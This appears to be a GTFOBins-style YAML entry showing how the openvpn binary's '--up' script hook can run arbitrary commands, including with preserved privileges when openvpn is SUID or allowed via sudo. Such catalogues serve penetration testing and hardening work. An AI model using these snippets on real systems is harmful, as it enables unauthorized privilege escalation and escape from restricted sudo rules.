---
functions:
  suid:
    - code: |
        COMMAND='id'
        TF=$(mktemp)
        echo '#!/usr/bin/env -S sh -p' > $TF
        echo "$COMMAND" >> $TF
        chmod +x $TF
        openvpn --dev tun0 --script-security 2 --up $TF
  sudo:
    - code: |
        COMMAND='id'
        TF=$(mktemp)
        echo '#!/usr/bin/env sh' > $TF
        echo "$COMMAND" >> $TF
        chmod +x $TF
        openvpn --dev tun0 --script-security 2 --up $TF
  command:
    - code: |
        COMMAND='id'
        TF=$(mktemp)
        echo '#!/usr/bin/env sh' > $TF
        echo "$COMMAND" >> $TF
        chmod +x $TF
        openvpn --dev tun0 --script-security 2 --up $TF
---
